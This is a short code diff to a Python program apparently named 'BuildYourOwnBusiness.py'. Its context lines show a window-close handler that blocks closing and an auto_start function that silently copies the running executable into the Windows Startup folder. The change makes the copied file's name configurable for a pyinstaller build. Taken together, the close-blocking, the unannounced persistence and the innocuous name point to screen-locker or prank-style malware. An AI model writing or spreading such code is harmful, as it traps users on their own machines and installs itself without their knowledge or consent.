@@ -3,6 +3,8 @@ import os
 import shutil
 import sys
 
+file = "BuildYourOwnBusiness.py" # If you convert the script to exe with pyinstaller or rename the file, change the name.
+
 def on_close(event=None):
     print("Schließen blockiert")
 
@@ -19,7 +21,7 @@ def auto_start():
     try:
         current_path = sys.executable
         autostart_folder = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-        target_path = os.path.join(autostart_folder, "BuildYourOwnBusiness.py")
+        target_path = os.path.join(autostart_folder, str(file))
         shutil.copy2(current_path, target_path)
     except Exception as e:
         print(f"Auto-start error: {e}")
